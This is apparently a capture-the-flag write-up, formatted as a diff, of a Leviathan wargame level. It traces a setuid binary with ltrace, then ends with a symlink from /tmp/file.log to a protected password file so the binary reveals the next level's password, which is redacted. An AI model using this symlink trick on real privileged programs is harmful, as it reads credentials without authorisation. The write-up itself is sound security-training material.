@@ -1,0 +1,88 @@
+On to the next challenge Capt'n!!
+====================== For starters =====================================
+leviathan5@melinda:~$ ls
+leviathan5
+leviathan5@melinda:~$ file leviathan5 
+leviathan5: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=c71b3ae0d0395851879ee6fb8ede92e1676ecf71, not stripped
+leviathan5@melinda:~$ ./leviathan5 
+Cannot find /tmp/file.log
+leviathan5@melinda:~$ touch /tmp/file.log
+leviathan5@melinda:~$ ltrace ./leviathan5
+__libc_start_main(0x80485ed, 1, 0xffffd794, 0x8048690 <unfinished ...>
+fopen("/tmp/file.log", "r")                                                                                                   = 0x804b008
+fgetc(0x804b008)                                                                                                              = '\377'
+feof(0x804b008)                                                                                                               = 1
+fclose(0x804b008)                                                                                                             = 0
+getuid()                                                                                                                      = 12005
+setuid(12005)                                                                                                                 = 0
+unlink("/tmp/file.log")                                                                                                       = 0
++++ exited (status 0) +++
+
+
+mmmmkay, so not much there.... what happens if we add some rubbish to /tmp/file.log??
+
+============================== Appies ========================================
+
+leviathan5@melinda:~$ echo "AAAAAAAAAA" >> /tmp/file.log
+leviathan5@melinda:~$ cat /tmp/file.log
+AAAAAAAAAA
+leviathan5@melinda:~$ ltrace ./leviathan5
+__libc_start_main(0x80485ed, 1, 0xffffd794, 0x8048690 <unfinished ...>
+fopen("/tmp/file.log", "r")                                                                                                   = 0x804b008
+fgetc(0x804b008)                                                                                                              = 'A'
+feof(0x804b008)                                                                                                               = 0
+putchar(65, 0x8048720, 0xffffd79c, 0xf7e5619d)                                                                                = 65
+fgetc(0x804b008)                                                                                                              = 'A'
+feof(0x804b008)                                                                                                               = 0
+putchar(65, 0x8048720, 0xffffd79c, 0xf7e5619d)                                                                                = 65
+fgetc(0x804b008)                                                                                                              = 'A'
+feof(0x804b008)                                                                                                               = 0
+putchar(65, 0x8048720, 0xffffd79c, 0xf7e5619d)                                                                                = 65
+fgetc(0x804b008)                                                                                                              = 'A'
+feof(0x804b008)                                                                                                               = 0
+putchar(65, 0x8048720, 0xffffd79c, 0xf7e5619d)                                                                                = 65
+fgetc(0x804b008)                                                                                                              = 'A'
+feof(0x804b008)                                                                                                               = 0
+putchar(65, 0x8048720, 0xffffd79c, 0xf7e5619d)                                                                                = 65
+fgetc(0x804b008)                                                                                                              = 'A'
+feof(0x804b008)                                                                                                               = 0
+putchar(65, 0x8048720, 0xffffd79c, 0xf7e5619d)                                                                                = 65
+fgetc(0x804b008)                                                                                                              = 'A'
+feof(0x804b008)                                                                                                               = 0
+putchar(65, 0x8048720, 0xffffd79c, 0xf7e5619d)                                                                                = 65
+fgetc(0x804b008)                                                                                                              = 'A'
+feof(0x804b008)                                                                                                               = 0
+putchar(65, 0x8048720, 0xffffd79c, 0xf7e5619d)                                                                                = 65
+fgetc(0x804b008)                                                                                                              = 'A'
+feof(0x804b008)                                                                                                               = 0
+putchar(65, 0x8048720, 0xffffd79c, 0xf7e5619d)                                                                                = 65
+fgetc(0x804b008)                                                                                                              = 'A'
+feof(0x804b008)                                                                                                               = 0
+putchar(65, 0x8048720, 0xffffd79c, 0xf7e5619d)                                                                                = 65
+fgetc(0x804b008)                                                                                                              = '\n'
+feof(0x804b008)                                                                                                               = 0
+putchar(10, 0x8048720, 0xffffd79c, 0xf7e5619dAAAAAAAAAA
+)                                                                                = 10
+fgetc(0x804b008)                                                                                                              = '\377'
+feof(0x804b008)                                                                                                               = 1
+fclose(0x804b008)                                                                                                             = 0
+getuid()                                                                                                                      = 12005
+setuid(12005)                                                                                                                 = 0
+unlink("/tmp/file.log")                                                                                                       = 0
++++ exited (status 0) +++
+
+Alright, so it reads /tmp/file.log char by char and outputs to stdout; just to confirm:
+leviathan5@melinda:~$ touch /tmp/file.log
+leviathan5@melinda:~$ echo "AAAAAAAAAA" >> /tmp/file.log
+leviathan5@melinda:~$ ./leviathan5 
+AAAAAAAAAA
+
+
+=============================== Main course =============================================
+Let's make that file.log nonsense point to the passw file
+leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log      
+leviathan5@melinda:~$ ./leviathan5 
+[... REDACTED ...]
+
+=============================== Dessert ==================================================
+Sweet sweet victory!
